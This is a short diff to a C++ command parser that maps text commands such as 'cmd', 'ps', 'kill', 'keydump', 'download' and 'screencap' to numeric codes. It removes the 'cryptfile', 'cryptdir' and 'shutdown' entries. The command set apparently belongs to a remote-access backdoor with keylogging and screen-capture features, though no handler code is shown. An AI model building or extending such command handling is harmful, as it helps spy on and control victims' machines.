@@ -26,7 +26,7 @@ bool dirExists(const std::string& dirName_in) {
 }
 
 int parse(std::string comm) {
-	if (comm == "help")  return 1;
+	if (comm == "help")			  return 1;
 	else if (comm == "close")     return 2;
 	else if (comm == "pwd")       return 3;
 	else if (comm == "cmd")		  return 4;
@@ -37,11 +37,8 @@ int parse(std::string comm) {
 	else if (comm == "ps")        return 9;
 	else if (comm == "kill")      return 10;
 	else if (comm == "keydump")   return 11;
-	else if (comm == "cryptfile") return 12;
-	else if (comm == "cryptdir")  return 13;
-	else if (comm == "download")  return 14;
-	else if (comm == "shutdown")  return 15;
-	else if (comm == "error")     return 16;
-	else if (comm == "screencap") return 17;
+	else if (comm == "download")  return 12;
+	else if (comm == "error")     return 13;
+	else if (comm == "screencap") return 14;
 	else return 0;
 }
